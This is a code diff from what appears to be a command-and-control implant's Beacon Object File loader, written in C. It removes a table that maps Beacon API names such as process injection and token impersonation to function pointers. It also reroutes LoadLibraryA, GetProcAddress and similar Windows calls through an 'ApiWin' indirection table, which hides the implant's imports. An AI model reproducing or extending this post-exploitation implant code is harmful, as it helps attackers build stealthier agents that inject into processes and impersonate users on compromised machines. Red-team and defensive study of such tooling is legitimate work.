@@ -17,42 +17,6 @@ void BofOutputToTask(int type, PBYTE data, int dataSize)
 	}
 }
 
-int BeaconFunctionsCount = 32;
-unsigned char* BeaconFunctions[32][2] = {
-	{(unsigned char*)"BeaconDataParse",		(unsigned char*)BeaconDataParse},
-	{(unsigned char*)"BeaconDataInt",		(unsigned char*)BeaconDataInt},
-	{(unsigned char*)"BeaconDataShort",		(unsigned char*)BeaconDataShort},
-	{(unsigned char*)"BeaconDataLength",	(unsigned char*)BeaconDataLength},
-	{(unsigned char*)"BeaconDataExtract",	(unsigned char*)BeaconDataExtract},
-	{(unsigned char*)"BeaconFormatAlloc",	(unsigned char*)BeaconFormatAlloc},
-	{(unsigned char*)"BeaconFormatReset",	(unsigned char*)BeaconFormatReset},
-	{(unsigned char*)"BeaconFormatAppend",	(unsigned char*)BeaconFormatAppend},
-	{(unsigned char*)"BeaconFormatPrintf",	(unsigned char*)BeaconFormatPrintf},
-	{(unsigned char*)"BeaconFormatToString",(unsigned char*)BeaconFormatToString},
-	{(unsigned char*)"BeaconFormatFree",	(unsigned char*)BeaconFormatFree},
-	{(unsigned char*)"BeaconFormatInt",		(unsigned char*)BeaconFormatInt},
-	{(unsigned char*)"BeaconOutput",		(unsigned char*)BeaconOutput},
-	{(unsigned char*)"BeaconPrintf",		(unsigned char*)BeaconPrintf},
-	{(unsigned char*)"BeaconUseToken",		(unsigned char*)BeaconUseToken},
-	{(unsigned char*)"BeaconRevertToken",	(unsigned char*)BeaconRevertToken},
-	{(unsigned char*)"BeaconIsAdmin",		(unsigned char*)BeaconIsAdmin},
-	{(unsigned char*)"BeaconGetSpawnTo",	(unsigned char*)BeaconGetSpawnTo},
-	{(unsigned char*)"BeaconInjectProcess", (unsigned char*)BeaconInjectProcess},
-	{(unsigned char*)"BeaconInjectTemporaryProcess",(unsigned char*)BeaconInjectTemporaryProcess},
-	{(unsigned char*)"BeaconSpawnTemporaryProcess", (unsigned char*)BeaconSpawnTemporaryProcess},
-	{(unsigned char*)"BeaconCleanupProcess",        (unsigned char*)BeaconCleanupProcess},
-	{(unsigned char*)"toWideChar",          (unsigned char*)toWideChar},
-	{(unsigned char*)"BeaconInformation",   (unsigned char*)BeaconInformation},
-	{(unsigned char*)"BeaconAddValue",      (unsigned char*)BeaconAddValue},
-	{(unsigned char*)"BeaconGetValue",      (unsigned char*)BeaconGetValue},
-	{(unsigned char*)"BeaconRemoveValue",   (unsigned char*)BeaconRemoveValue},
-	{(unsigned char*)"LoadLibraryA",		(unsigned char*)proxy_LoadLibraryA},
-	{(unsigned char*)"GetProcAddress",		(unsigned char*)proxy_GetProcAddress},
-	{(unsigned char*)"GetModuleHandleA",	(unsigned char*)proxy_GetModuleHandleA},
-	{(unsigned char*)"FreeLibrary",			(unsigned char*)proxy_FreeLibrary},
-	{(unsigned char*)"__C_specific_handler", NULL}
-};
-
 unsigned int swap_endianess(unsigned int indata)
 {
 	unsigned int testint = 0xaabbccdd;
@@ -136,7 +100,7 @@ void BeaconFormatAlloc(formatp* format, int maxsz)
 	if (format == NULL) {
 		return;
 	}
-	format->original = (PCHAR)LocalAlloc(maxsz, 1);
+	format->original = (PCHAR)ApiWin->LocalAlloc(maxsz, 1);
 	format->buffer = format->original;
 	format->length = 0;
 	format->size = maxsz;
@@ -322,20 +286,20 @@ PCHAR BeaconGetCustomUserData()
 
 HMODULE proxy_LoadLibraryA(LPCSTR lpLibFileName)
 {
-	return LoadLibraryA(lpLibFileName);
+	return ApiWin->LoadLibraryA(lpLibFileName);
 }
 
 HMODULE proxy_GetModuleHandleA(LPCSTR lpModuleName)
 {
-	return GetModuleHandleA(lpModuleName);
+	return ApiWin->GetModuleHandleA(lpModuleName);
 }
 
 FARPROC proxy_GetProcAddress(HMODULE hModule, LPCSTR  lpProcName)
 {
-	return GetProcAddress(hModule, lpProcName);
+	return ApiWin->GetProcAddress(hModule, lpProcName);
 }
 
 BOOL proxy_FreeLibrary(HMODULE hLibModule)
 {
-	return FreeLibrary(hLibModule);
+	return ApiWin->FreeLibrary(hLibModule);
 }
